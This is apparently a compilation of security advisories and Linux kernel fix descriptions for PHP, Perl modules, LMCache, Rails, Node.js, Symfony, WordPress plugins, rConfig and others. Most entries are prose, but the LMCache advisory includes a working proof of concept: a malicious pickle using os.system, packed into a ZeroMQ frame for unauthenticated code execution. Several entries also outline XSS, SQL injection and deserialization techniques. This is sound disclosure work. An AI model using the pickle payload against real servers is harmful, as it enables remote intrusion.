xfs: mark the inode preallocated for pNFS write layouts past EOF

xfs_fs_map_blocks() marks the inode XFS_DIFLAG_PREALLOC only when it
allocates blocks for a write layout. A write layout past EOF can also
hand out allocated blocks, such as speculative preallocation. blockgc
then frees them under the layout, and another file may get them.

Mark the inode whenever a write mapping ends past EOF.

Use-after-free after interrupted session shutdown.

The session extension records the filename of the executing script when a session starts. If a fatal error occurs in an application callback while the session variables are destroyed at shutdown, such as stream_close() of a user-defined stream wrapper, the pointer is retained after the request memory is freed, and a later request handled by the same worker can free the stale string. An attacker who can trigger such a failing cleanup may crash the worker or corrupt memory; code execution has not been demonstrated. This requires the filename to be allocated in request memory, for example when the script is not cached by OPcache.

This issue affects PHP versions 8.3.* before 8.3.37, 8.4.* before 8.4.28 and 8.5.* before 8.5.13.

In the Linux kernel, the following vulnerability has been resolved:

tcp: prevent collapsing skbs across boundary in rtx queue

tcp_write_collapse_fence() sets TCP_SKB_CB(skb)->eor = 1 on
tcp_write_queue_tail(sk) to prevent skbs queued after a switch to
device encryption from being collapsed into earlier skbs.

The fence is a no-op if all earlier data has already been transmitted
when the switch happens: sk->sk_write_queue is empty. The not yet
acknowledged earlier skbs wait in sk->tcp_rtx_queue with eor 0.

On a subsequent retransmit or SACK shift, tcp_retrans_try_collapse() or
tcp_shift_skb_data() can then merge an skb queued after the switch into
one queued before it.

Both users of the fence are affected:

- psp: devices only encrypt skbs with skb->decrypted set. The merged skb
  keeps decrypted = 0 from the earlier skb, so merged data sent after
  psp_sock_assoc_set_tx() is retransmitted in cleartext.

- tls device offload: the merged skb straddles the start marker set in
  tls_set_device_offload(). The software fallback (fill_sg_in() returns
  -EINVAL) and the mlx5, nfp and funeth drivers cannot handle such an
  skb and drop it. Every retransmit rebuilds the same skb, so the
  connection stalls.

Fix this in two places, for defense in depth:

1. Fall back to tcp_rtx_queue_tail(sk) in tcp_write_collapse_fence()
   when tcp_write_queue_tail(sk) is NULL.

2. Check !skb_cmp_decrypted(to, from) in tcp_skb_can_collapse(), as
   tcp_skb_can_collapse_rx() does on receive. skb_shift(), which both
   collapse paths call, already has a DEBUG_NET_WARN_ON_ONCE() for this
   condition.

Mozilla::CA versions before 20261020 for Perl provide a CA certificate bundle containing a root linked to compromised intermediates.

The bundle includes "emSign ECC Root CA - G3", which provides a trust path for intermediate certificates whose private keys are publicly available.

An attacker able to intercept or redirect client traffic may use these keys to impersonate a TLS server.

LWP, HTTP::Tiny and other clients normally use IO::Socket::SSL, which looks for CA certificates in OpenSSL's default locations before falling back to Mozilla::CA.

Configuration and environment variables can override this selection. Users should check which CA store their client uses. If it uses the system store, check for and install the operating system vendor's updates for this incident.

Rex versions through 1.16.1 for Perl accept an unknown SSH host key for remote rsync transfers because sync hardcodes StrictHostKeyChecking=no.

Every remote branch of sync builds its ssh command with that option, for password authentication, for private-key authentication and for the fallback. The ssh options a caller sets through set_openssh_opt reach the OpenSSH transport but not this command, so there is no configuration that restores host key checking for the transfer.

An attacker who can redirect the connection before the real host key is known presents their own and the transfer proceeds: under password authentication sync sends the connection password to that server, an upload writes the selected local files to it, and a download writes what it returns to the local destination.

When using the OpenSSL TLS implementation, both the pn_ssl_domain_set_trusted_ca_db() & pn_tls_config_set_trusted_certs() APIs added to rather than replaced the default system trust anchors. Leading to potentially trusting unexpected peer certificates.



This can be worked around by setting the SSL_CERT_FILE environment variable for the application to /dev/null.



This issue does not affect the Win32 SChannel TLS implementation.



This issue affects Apache Qpid Proton C: through 0.40.0.



Users are recommended to upgrade to version 0.41.1, which fixes the issue.

items.description: In Eclipse Ditto versions 1.1.0 to 3.9.8, when pre-authentication is enabled, the gateway service accepts the pre-authenticated subject not only from the `x-ditto-pre-authenticated` HTTP header set by a trusted reverse proxy, but also from an undocumented `x-ditto-pre-authenticated` URL query parameter that a client can set. A reverse proxy that only overwrites the header therefore does not stop clients from supplying their own subject. With the default configuration of the Ditto Helm chart (`global.jwtOnly: false`, which implicitly enables pre-authentication), the bundled nginx skips HTTP Basic authentication for any request with an `Authorization: Bearer` header and forwards it without the pre-authentication header. An unauthenticated remote attacker can send an invalid Bearer token together with the query parameter to authenticate as any chosen policy subject. Pre-authentication succeeds before the JWT is validated, so the attacker can read and modify Things and Policies with that subject's permissions. As a mitigation, disable pre-authentication in the gateway (`ENABLE_PRE_AUTHENTICATION=false`) or, when using the Helm chart, configure `global.jwtOnly: true`.

items.title: LMCache: Remote code execution via unsafe deserialization in multiprocess mode transport
items.description:
### Summary

LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport



### Details

LMCache multiprocess mode, also called distributed mode, opens an unauthenticated ZeroMQ ROUTER so worker processes can register and share KV cache blocks. The intended clients are sibling LMCache processes. There is no CURVE, ZAP, password, or message authentication on that socket. LMCache used only inside a vLLM process does not open this port. The transport binds to localhost unless the operator sets a routable address with --host, which is how multi-node deployments let peers connect. The 9.8 score is for that routable configuration. A stock single-host install that leaves the default bind is not reachable from other machines.

Messages on the socket are msgpack. Extension code 1 is registered for DeviceIPCWrapper and is passed to DeviceIPCWrapper.Deserialize in lmcache/v1/platform/base/ipc_wrapper.py, which calls pickle.loads. That hook runs from ext_hook in lmcache/v1/multiprocess/custom_types.py while the server is still decoding REGISTER_KV_CACHE arguments, before the handler runs. A single unauthenticated ZMQ DEALER message to the transport port (default 5555) therefore executes code as the user the LMCache process runs as. Official container images run that process as root.

The decode path shipped in v0.3.9. It is still present in the latest PyPI release, v0.5.5, in the v0.5.6 release candidates through v0.5.6rc3, and on the dev branch as of 2026-10-07. No fixed version has been published.



### Proof of concept

Step 1 - Start multiprocess mode bound to a routable address


This is the documented multi-node setting. The ZMQ transport listens on port 5555.

```
   python -m lmcache.v1.multiprocess.http_server \
    --http-host 127.0.0.1 --http-port 8080 \
    --host 0.0.0.0 --port 5555 \
    --l1-size-gb 0.25 --eviction-policy LRU \
    --hash-algorithm blake3 --instance-id mp-node-01
```
Step 2 - Build a REGISTER_KV_CACHE frame whose cache slot is a pickle


Payload slot 1 is a msgpack extension with code 1. The server unpickles that body while it is still decoding arguments. The command writes id to /tmp/zmq_pwn.

```
import os
import pickle
import msgspec
import zmq

class EvilPayload:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return (os.system, (self.cmd,))

evil_pickle = pickle.dumps(EvilPayload("id > /tmp/zmq_pwn 2>&1"))

REGISTER_KV_CACHE = 1
EXT_CODE = 1
NUM_PAYLOADS = 7
KVCACHE_INDEX = 1

b_uid = msgspec.msgpack.encode(0)
b_type = msgspec.msgpack.encode(REGISTER_KV_CACHE)
payloads = [msgspec.msgpack.encode(None)] * NUM_PAYLOADS
payloads[0] = msgspec.msgpack.encode(0)
payloads[KVCACHE_INDEX] = msgspec.msgpack.encode(
    [msgspec.msgpack.Ext(EXT_CODE, evil_pickle)]
)
frames = [b_uid, b_type, *payloads]
```
Step 3 - Send the frame


```
ctx = zmq.Context()
s = ctx.socket(zmq.DEALER)
s.connect("tcp://127.0.0.1:5555")
s.send_multipart(frames)
```
The pickle runs during argument decode. The server then logs a type error for REGISTER_KV_CACHE because the handler expected a DeviceIPCWrapper and received the return value of os.system. That error is after the command has already run.


Step 4 - Confirm the command ran as the LMCache user


```
cat /tmp/zmq_pwn
```
Expected output on an official image, where the process runs as root:

```
uid=0(root) gid=0(root) groups=0(root)
```

### Impact

LMCache's multiprocess (MP) mode uses a ZeroMQ transport (port 5555 by default) that does not require authentication. Device IPC descriptors received on this transport were deserialized with `pickle.loads`. An attacker who can reach the transport port can send a single crafted message and execute arbitrary code with the privileges of the LMCache process.

By default the transport binds to localhost, and single-process (in-process) mode does not open the port. Deployments are exposed when the transport binds a routable address, as multi-node setups do. The project's example Kubernetes deployment bound all interfaces, and official container images ran as root, so deployments based on them should be treated as exposed.

Affected: 0.3.9 through 0.5.5, the 0.5.6 release candidates, and `dev` branch builds before PR #5644.


### Patches

Fixed in **0.5.6**. Pickle has been replaced with versioned, typed MessagePack descriptors that are validated before use; the device wrapper type is selected from a fixed local allowlist, and there is no pickle fallback. Both the ZeroMQ and gRPC transport paths are covered.

The wire format has changed: upgrade all workers and servers together.

0.5.6 also binds the example Kubernetes deployment to localhost (PR #5684) and runs official images as a non-root user (PR #5685).

### Workarounds

Until you can upgrade:

- Do not bind the transport to a routable address; keep it on localhost or a trusted cluster network.
- Restrict access to the transport port (5555 by default) with firewall rules or network policies.
- Run LMCache as a non-root user (build from the provided Dockerfile if needed).

If the transport port was ever reachable from an untrusted network, treat the host as potentially compromised: review connections to the port, check for unexpected processes or outbound connections from the LMCache process, rotate reachable credentials, and redeploy from clean images.

smb: client: use finish_no_open() for non-regular inodes

An O_CREAT open can find an existing symlink or another non-regular
inode. cifs_atomic_open() calls finish_open() on it and attaches a
cifsFileInfo. Symlink inodes have no CIFS release operation, so the
dentry reference held by cifsFileInfo is leaked. FMODE_OPENED also
prevents the VFS from following the symlink.

Track whether cifs_do_create() returned an open server handle. For
non-regular inodes, close the handle if present, remove the pending
open, and call finish_no_open() so the VFS can continue the lookup.
Do not set FMODE_CREATED unless a regular file was opened. For
O_NOFOLLOW with __O_REGULAR, return -ELOOP before the VFS's
-EFTYPE check.

Defer closing a legacy POSIX handle on a non-regular inode until
after inode lookup. This avoids closing it again if lookup fails.

In the Linux kernel, the following vulnerability has been resolved:

smb: client: fix next_buffer UAF and NextCommand bounds in compound PDUs

Fix several related bounds checking and pointer lifecycle issues in
receive_encrypted_standard()'s handling of compound encrypted frames:

- Clear next_buffer after assigning it to server->bigbuf. A stale
  next_buffer pointer can lead to a use-after-free on subsequent
  error paths.
- Update pdu_length to the decrypted plaintext size (buf_size). Using
  the pre-decryption length allows NextCommand to point into stale
  ciphertext residue.
- Reject next_cmd values smaller than MID_HEADER_SIZE(server).
- Fix an integer overflow in the upper bound check by verifying
  pdu_length - next_cmd < MID_HEADER_SIZE(server), ensuring the
  trailing slice is large enough for a header.

In Trail of Bits fickling through 0.1.12, a pickle STACK_GLOBAL operand carrying a dotted __qualname__ (for example "Values.read_file") is resolved by pickle's find_class through _getattribute to an arbitrary attribute path rather than to a module-level function. Fickling records only the leading component of the name in its import tracking and renders the operation as a plain import (for instance, 'python -m fickling' displays it as 'from optparse import Values.read_file'), so the trailing attribute reference is never analyzed as a call. The OvertlyBadEvals analysis pass does not flag it, and check_safety() returns LIKELY_SAFE with zero findings. This allows an attacker to reach a class method that performs code execution: optparse.Values.read_file executes exec(open(filename).read(), vars), achieving arbitrary code execution when the crafted pickle is loaded through fickling.load(), which chains check_safety() into pickle.loads() as an explicit security gate. optparse is present in all current CPython 3.x releases (deprecated as of Python 3.13, not removed). This weakness is in the resolution and analysis of dotted attribute-path names, and is distinct from and independently fixable from the module-origin trust weakness tracked as CVE-2026-16760: resolving or flagging dotted attribute-path imports closes this vector while leaving the module-level trust behavior unchanged. This bypass was verified to remain present on the vendor master branch at commit d011709 as of 2026-10-30, after the vendor's October blocklist additions and a new heuristic that flags private stdlib attributes; because the public class method Values.read_file is neither blocklisted nor flagged as a private attribute, it is not addressed by those remediations.

items.title: Laravel TokenGuard authentication bypass through non-string API credentials
items.description:
Laravel's built-in TokenGuard, **when configured with a standard token-based API guard**, may be bypassed to authenticate as an arbitrary existing user without knowledge of their valid API token. 

**Under certain database configurations (MySQL/MariaDB)** an attacker can submit a specially crafted, non-string credential value that is mishandled during the authentication lookup, causing the underlying query to match an unintended user record rather than failing authentication as expected.

### Impact
An unauthenticated attacker may authenticate as another user without possessing that user's API token, leading to authentication bypass and account takeover on any route protected by the affected guard.

items.title: Active Storage: Possible arbitrary file write and read in image analysis
items.description:
### Impact
A Rails application that processes attachments with ImageMagick may allow an unauthenticated attacker to write arbitrary files on the server and, when attachments are stored with the Disk service, to read arbitrary files readable by the application process. Those files typically include `secret_key_base` and credentials for external systems, which may in turn allow escalation to remote code execution or lateral movement to those systems.

### Details
ImageMagick selects a coder from the content of the file it is given, and some coders act on files named inside the image rather than on the image itself. Active Storage constrained none of ImageMagick's coders, and the ImageMagick analyzer runs when a file is attached, so an attacker who can upload a crafted file may be able to invoke one. Attaching the upload is sufficient; no variant, preview, or `analyze` call is required. One specific attack chain has been reported to us, but we do not assume it is the only one that exists.

The fixed versions ship an ImageMagick security policy and prepend its directory to `MAGICK_CONFIGURE_PATH` through `MiniMagick.cli_env`, so every ImageMagick process that MiniMagick spawns applies it. The policy denies the `MSL` scripting coder, the coders that read or delete files other than the image, fetch remote or local references, or display to a screen, every coder backed by Ghostscript together with the `gs` delegate, and `@filename` indirection. ImageMagick applies every `policy.xml` on its search path, so the shipped policy adds to the host's policy rather than replacing it. The policy applies to every ImageMagick command that MiniMagick runs, not only those of Active Storage. See the `activestorage` CHANGELOG and "ImageMagick Security Policy" in the Active Storage guide.

### Affected applications
An application is affected if it meets all of these requirements:
- Uses ImageMagick for Active Storage image processing. This is `config.active_storage.variant_processor = :mini_magick`, which is the default for applications on `load_defaults 6.1` or earlier.
- Runs ImageMagick under a security policy that does not already deny the coders involved. The policies that Debian and Ubuntu package do not.
- Allows file uploads from untrusted users.

### Mitigation
- Upgrade to a fixed version of `activestorage`.
- An application whose variant processor is `:mini_magick` must use mini_magick `>= 5.1`, which applying the policy requires. With an older mini_magick, such an application raises an exception during boot.
- An application that renders PostScript or PDF through ImageMagick must re-allow the `gs` delegate and the coders it uses in the host's `policy.xml`.
- An application that replaces `MiniMagick.cli_env` after boot, clears the environment with `MiniMagick.cli_prefix`, or installs its own `MiniMagick::Shell` does not receive the shipped policy and must carry its rules in ImageMagick's system policy. GraphicsMagick does not read ImageMagick policies.
- If attachments are stored with the Disk service, change `secret_key_base` and every secret readable by the application process, including the master key and everything `config/credentials.yml.enc` holds, storage and database credentials, and third-party tokens. Do not retain an exposed secret as a fallback.

### Workarounds
Copy the rules of the policy that the fixed versions ship, `activestorage/lib/active_storage/image_magick/policy.xml`, into ImageMagick's system policy, for example `/etc/ImageMagick-7/policy.xml`. At a minimum, deny the `MSL` coder, the Ghostscript coders, and the `gs` delegate:

```xml
<policy domain="coder" rights="none" pattern="MSL"/>
<policy domain="delegate" rights="none" pattern="gs"/>
<policy domain="coder" rights="none" pattern="{PS,PS2,PS3,EPS,EPS2,EPS3,EPI,EPSF,EPSI,EPT,EPT2,EPT3,PDF,AI,EPDF,PDFA,POCKETMOD,XPS,PCL}"/>
```

### Releases
The fixed releases are available at the normal locations.

Patches for those who cannot upgrade at once:
- 8.1: https://github.com/rails/rails/commit/468aa9a93fc98f5476b6821770f4ccfcb7f7d328
- 8.0: https://github.com/rails/rails/commit/ea8c40121ce53a3d0255cd4eb6d13bfe3bc01776

### Versions affected
- activestorage < 8.0.5.2
- activestorage >= 8.1, < 8.1.4.1

### Credit
This issue was responsibly reported by HackerOne researcher [ryotak](https://hackerone.com/ryotak).

### References
- ImageMagick [security policy](https://imagemagick.org/security-policy/)

In the Linux kernel, the following vulnerability has been resolved:

smb: client: fix slab-out-of-bounds write in id_mode_to_cifs_acl()

In id_mode_to_cifs_acl(), while the chown branch reserves
sizeof(struct smb_ntsd) + 2 * sizeof(struct smb_sid) (plus
sizeof(struct smb_acl) and the worst-case ACE space after
commit 0ee150794c75 ("smb: client: fix heap overflow in DACL owner/group
rewrite")), the chmod branch only adds 2 * sizeof(struct smb_ace) or
5 * sizeof(struct smb_ace) to secdesclen (or 1 * sizeof(struct smb_ace)
on posix).

However, the chmod branch also invokes build_sec_desc() ->
copy_sec_desc(), which unconditionally writes the Owner SID at
pnntsd + sidsoffset and the Group SID at
pnntsd + sidsoffset + sizeof(struct smb_sid) (2 * 68 = 136 bytes total),
and set_chmod_dacl() always writes a struct smb_acl header (8 bytes)
even when the source descriptor has dacloffset == 0. When a security
descriptor has compact or overlapping Owner/Group SIDs (or
dacloffset == 0), calling chmod() under-allocates pnntsd and writes past
the end of the slab buffer.

Reserve sizeof(struct smb_acl) + 2 * sizeof(struct smb_sid) (plus
sizeof(struct smb_ntsd) on the posix path) in the chmod branch of
id_mode_to_cifs_acl().

items.title: Node.js is vulnerable to a certificate validation bypass in https.Agent via cross-policy TLS session reuse
items.description: A certificate validation bypass in Node.js https.Agent lets a cached TLS session authenticated under one CA policy be reused by a later request with a stricter policy. https.Agent.prototype.getName() assigns the same Agent and session-cache key to a request that omits ca and one that explicitly supplies ca: [], because an omitted value appends nothing to the key while an empty array stringifies to an empty string. The two policies differ: omitting ca uses the default trust store, while supplying ca replaces it. Since they share a key, a TLS session authenticated under the broader default policy is handed to a new connection made under the later ca: [] policy, and TLS 1.3 session resumption carries the earlier authentication forward, so the second request reports authorized === true and transmits confidential data to a server its own CA policy would reject on a fresh connection. This vulnerability affects Node.js 26.x, 24.x, and 22.x.

items.title: Symfony: Unbounded Recursion in the YAML Inline Lexer Lets a Single Document Crash the Process
items.description:
### Description

`Yaml\Parser::lexInlineStructure()` recursed through `lexInlineMapping()` and `lexInlineSequence()` for every `{` and `[` of an inline collection, without entering the nesting level that the rest of the parser bounds with `maxNestingLevel`. A document made of deeply nested inline collections, such as `[[[[...]]]]`, exhausted the stack while it was being lexed: depending on the PHP version and its stack settings, the process crashed or the request ended with a fatal error.

Any code parsing untrusted YAML is affected. That includes `#[MapRequestPayload]` when the Yaml component is installed and the endpoint does not restrict `acceptFormat`: a single unauthenticated request with a YAML content type is enough.

### Resolution

The inline lexer now enters and leaves the same nesting level as the rest of the parser, so nested inline collections are bounded by `maxNestingLevel`, and the parser raises a `ParseException` beyond it.

The patches for this issue are available [here](https://github.com/symfony/symfony/commit/2a8bf9c58d862b0c76a35ce288d1ba6a27223aad) for branch 5.4 (and forward-ported to 6.4, 7.4, 8.1 and 8.2).

### Credits

We would like to thank Nicolas Grekas for reporting the issue and providing the fix.

### References

- Fix: [#65688](https://github.com/symfony/symfony/pull/65688)

items.title: Symfony: ReDoS in HeaderUtils::split() Reachable Through the Cache-Control Request Header
items.description:
### Description

`HeaderUtils::split()` parsed header values with a pattern whose token alternative also matched whitespace, followed by a `(?<!\s)` lookbehind. A run of whitespace placed before a separator could be divided among the iterations of the enclosing repetition in exponentially many ways, and the engine tried all of them before settling. `HeaderBag` calls it for the `Cache-Control` header whenever a `Request` is built, so any application handling HTTP requests is reachable, with no authentication.

A single request carrying such a header costs close to a second of CPU (813 ms for a run of 17 spaces in an 8 KB header on PHP 8.5, doubling with each extra space). From 18 spaces on, `preg_match_all()` gives up at `pcre.backtrack_limit` and `split()` returns an empty array, so every directive of the header is silently dropped.

### Resolution

The pattern now consumes whitespace only when more of the value follows it, so a value can no longer end on whitespace, nothing has to be given back, and every quantifier is possessive. The first release of this fix broke splitting on a whitespace separator: `HeaderUtils::split('foo bar', ' ')` returned a single value in 6.4.46 to 6.4.47, 7.4.19 to 7.4.20 and 8.1.7 to 8.1.8. Whitespace characters used as separators are now left out of the whitespace branch, which 6.4.48, 7.4.21 and 8.1.9 contain.

The patches for this issue are available [here](https://github.com/symfony/symfony/commit/343a1772ce6ac03e48b228d2d7168d19750e3f36) for branch 5.4 (and forward-ported to 6.4, 7.4, 8.1 and 8.2).

### Credits

Symfony would like to thank [r3verii](https://github.com/r3verii) for reporting the issue and Nicolas Grekas for providing the fix.

Symfony would also like to thank [Bruno Dias](https://github.com/cx-bruno-dias) from Checkmarx for his help getting a CVE assigned.

Unauthenticated remote attackers can supply a crafted ICO image to corrupt adjacent heap chunk metadata, triggering a glibc abort that crashes the worker.

Attackers can send a 'deband coupling 1' command via sendcmd or an unauthenticated zmq filter, making chroma planes be processed at luma dimensions to crash the process or potentially execute code.

Denial of service through folded HTTP response headers.

The HTTP stream wrapper joins each continuation line of a folded response header to the accumulated value by allocating a new string and copying the whole value, so a response with many short continuation lines takes disproportionate CPU time to parse. An attacker who controls an HTTP or HTTPS response fetched through file_get_contents(), fopen() or other stream functions, by making the application request a chosen URL or by influencing a server it already contacts, can keep PHP workers busy. Repeated or concurrent requests can cause a denial of service.

This issue affects PHP versions from 8.1.32 through 8.1.34, from 8.2.28 before 8.2.36, from 8.3.18 before 8.3.37, from 8.4.5 before 8.4.28 and 8.5.* before 8.5.13.

items.description: An uncontrolled search path vulnerability (CWE-427) in statically linked OpenSSL libraries within Netskope Client (stAgentSvc.exe) and Endpoint DLP (epdlp.exe) on Windows allows an authenticated local attacker to execute arbitrary code with elevated SYSTEM privileges. The services retain internal build-time paths referencing a secondary drive location. On Windows systems where default volume permissions allow standard users to create root-level directories on secondary drives, an attacker can place a malicious configuration file (openssl.cnf) that is loaded under the NT AUTHORITY\SYSTEM context upon service startup or system reboot. Under default operating system permissions, macOS and Linux are not susceptible, and mobile platforms are unaffected.

items.title: GamiPress <= 8.1.3 - Authenticated (Subscriber+) SQL Injection via 'name-1[compare]' Parameter
items.description: The GamiPress – Gamification plugin to reward points, badges & ranks in WordPress, now with AI plugin for WordPress is vulnerable to generic SQL Injection via the 'name-1[compare]' parameter in all versions up to, and including, 8.1.3 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for authenticated attackers, with subscriber-level access and above, to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database. Exploitation requires that an administrator has published at least one GamiPress achievement step triggered by a Forminator field-value submission event, as the GamiPress Forminator integration listener is the only path that routes a form submission's raw field array — including the attacker-controlled compare operator — into gamipress_query_logs().

items.title: WPZOOM Forms <= 2.0.12 - Missing Authorization to Authenticated (Contributor+) Form Submission PII Disclosure via 'wpzf-submission' Post Type List Table
items.description: The WPZOOM Forms – Drag & Drop Contact Form Builder for WordPress plugin for WordPress is vulnerable to authorization bypass in all versions up to, and including, 2.0.12 This is due to the plugin not properly verifying that a user is authorized to perform an action. This makes it possible for authenticated attackers, with contributor-level access and above, to view the Name, Email address, and message excerpt stored in the _wpzf_fields meta of every form submission site-wide, regardless of submission ownership. Because public form submissions are stored with post_author=0, WordPress's built-in author-scoping guard in WP_Posts_List_Table is bypassed for Contributors who own zero submissions, causing the list query to return all submissions site-wide rather than only the authenticated user's own records.
vendor_products: wpzoom WPZOOM Forms – Drag & Drop Contact Form Builder for WordPress

items.title: Post Snippets <= 4.2.4 - Authenticated (Contributor+) Stored Cross-Site Scripting via Shortcode Attributes
items.description: The Post Snippets – Custom WordPress Code Snippets Customizer plugin for WordPress is vulnerable to Stored Cross-Site Scripting via Shortcode Attributes in all versions up to, and including, 4.2.4 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. Entity-encoded payloads such as <script>...</script> survive WordPress's wp_kses_post on-save sanitization because kses does not decode HTML entities, and are only converted back into executable HTML tags at render time by the plugin's own shortcode filter. This requires snippet shortcodes to be enabled.

items.title: Discussion Board <= 2.6.0 - Authenticated (Subscriber+) Stored Cross-Site Scripting via User Profile Website (user_url) Field
items.description: The Discussion Board – WordPress Forum Plugin plugin for WordPress is vulnerable to Stored Cross-Site Scripting in versions up to, and including, 2.6.0 via the user profile Website (user_url) field. This is due to insufficient output escaping in the ctdb_filter_comment_author_name() callback hooked to get_comment_author_link, which interpolates the raw user_url value into a single-quoted href attribute without esc_url() or esc_attr(). items.title: SEO Engine <= 0.9.9 - Authenticated (Contributor+) Stored Cross-Site Scripting via Entity-Encoded Post Title via Strip-then-Decode in build_title()
items.description: The SEO Engine – Smart SEO with AI, Schema & Redirection for WordPress plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'title' parameter in all versions up to, and including, 0.9.9 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. WordPress core's wp_filter_kses (applied via title_save_pre for Contributors and Authors) strips literal tag markup on save but leaves HTML-entity-encoded payloads intact in the database, meaning entity-encoded XSS payloads stored via the standard WordPress REST API (POST /wp-json/wp/v2/posts) are not neutralized before reaching the vulnerable sink.
vendor_products: tigroumeow SEO Engine – Smart SEO with AI, Schema & Redirection for WordPress

items.title: WPSpeed <= 2.6.10 - Authenticated (Subscriber+) Stored Cross-Site Scripting via User Nickname/Display Name
items.description: The WPSpeed plugin for WordPress is vulnerable to Stored Cross-Site Scripting in versions up to, and including, 2.6.10 This is due to a combination of two issues in the LightImages HTML optimizer: (1) Dispatcher::runOptimize() decides whether the current request is the site's home page by comparing only the URL path from REQUEST_URI against the path of the home URL, so on a plain-permalinks install the author archive URL /?author=<ID> is treated as the home page and the LightImages optimizer runs on it; and (2) LightImages::optimize() calls html_entity_decode() across the entire serialized DOMDocument output under the default-enabled img_processing_entity_decode setting, converting any entity-encoded markup present as plain text in the page (including WordPress's rendered author title) into live HTML. This makes it possible for authenticated attackers, with Subscriber-level access and above, to store entity-encoded markup in their own nickname/display_name through the normal profile endpoint and have that markup rehydrated into executing script when any logged-out visitor loads their author archive.
vendor_products: john-dagelmore WPSpeed – WordPress Speed, Cache & Performance Optimization (Core Web Vitals, PageSpeed 100)

rConfig Core 8.0.0 before 8.2.19 and rConfig Pro before 8.4.1 contain a deserialization of untrusted data vulnerability that allows unauthenticated network attackers to execute arbitrary code by pushing a crafted serialized job onto the Redis-backed Laravel Horizon queue, which runs without authentication in affected deployments. Laravel's CallQueuedHandler unserializes the job without class restrictions, allowing attackers to instantiate the existing App\\Jobs\\TaskDownloadRun class and invoke an attacker-controlled Artisan command. Attackers can leverage the bundled laravel/tinker package to execute arbitrary PHP and operating system commands as the queue worker's user, write a persistent web shell into the web-served storage/app/public directory, and read database credentials, stored device credentials, and API tokens. Where Redis is not directly reachable, authenticated attackers can deliver the payload through the application by configuring a device target that points at the rConfig server's loopback address.
